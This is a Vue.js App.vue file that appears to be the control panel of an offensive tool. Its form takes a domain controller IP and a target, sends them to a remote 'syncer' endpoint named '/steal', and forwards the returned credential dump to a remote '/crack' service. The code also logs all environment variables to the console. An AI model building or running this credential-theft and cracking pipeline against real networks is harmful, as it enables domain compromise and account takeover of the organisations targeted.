<template>
  <NavBar @clicked="onClickChild" />
  <StatusPage v-if="statusPage"  :phase="action_phase"/>
  <CreatePage @form_submit="form_submit" v-if="CreatePage" />
  <HomePage v-if="homePage" />
  <FooterBar class="absolute inset-x-0 bottom-0"/>
</template>

<script>

import NavBar from './components/NavBar.vue'
import StatusPage from './components/StatusPage.vue'
import CreatePage from './components/CreatePage.vue'
import HomePage from './components/HomePage.vue'
import FooterBar from './components/FooterBar.vue'


export default {
  name: 'App',
  components: {
    NavBar,
    StatusPage,
    CreatePage,
    HomePage,
    FooterBar
  },
  data() {
    return {
      statusPage : true,
      CreatePage: false,
      homePage: false,
      dump: '',
      action_phase : 0
    }
  },
   methods: {
    onClickChild (value) {
      console.log(process.env.VUE_APP_SYNCER_REMOTE_URL)
      console.log(process.env.VUE_APP_CRACKER_REMOTE_URL)
      console.log(process.env)
      if (value==="status") {
        this.statusPage = true;
        this.CreatePage = false;
        this.homePage = false;
      } else if (value==="create") {
        this.statusPage = false;
        this.CreatePage = true;
        this.homePage = false;
      }else {
        this.statusPage = false;
        this.CreatePage = false;
        this.homePage = true;
      }
      
    },
    form_submit(data) {
      console.log(data)
      
      // send POST request to localhost:36144 /steal
      const requestOptions = {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
        dc_ip: data.dc_ip,
        target: data.target
      })
      };
      this.statusPage = true;
      this.CreatePage = false;
      this.homePage = false;
      this.action_phase = 1;

      
      fetch(process.env.VUE_APP_SYNCER_REMOTE_URL+"/steal", requestOptions)
      .then(response => response.json())
      .then(response => {
        let entries = response.data.split("\n")
        const crackOptions = {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
          dc_ip: data.dc_ip,
          target: data.target,
          dump: entries
        })
        };
        this.action_phase = 2;

        fetch(process.env.VUE_APP_CRACKER_REMOTE_URL+"/crack",crackOptions)
        .then(response => response.json())
        .then(response => {
          console.log(response.state)
        });
        this.dump = response.data;
        
      })

    }
  }
}

</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #ffffff;
}
</style>
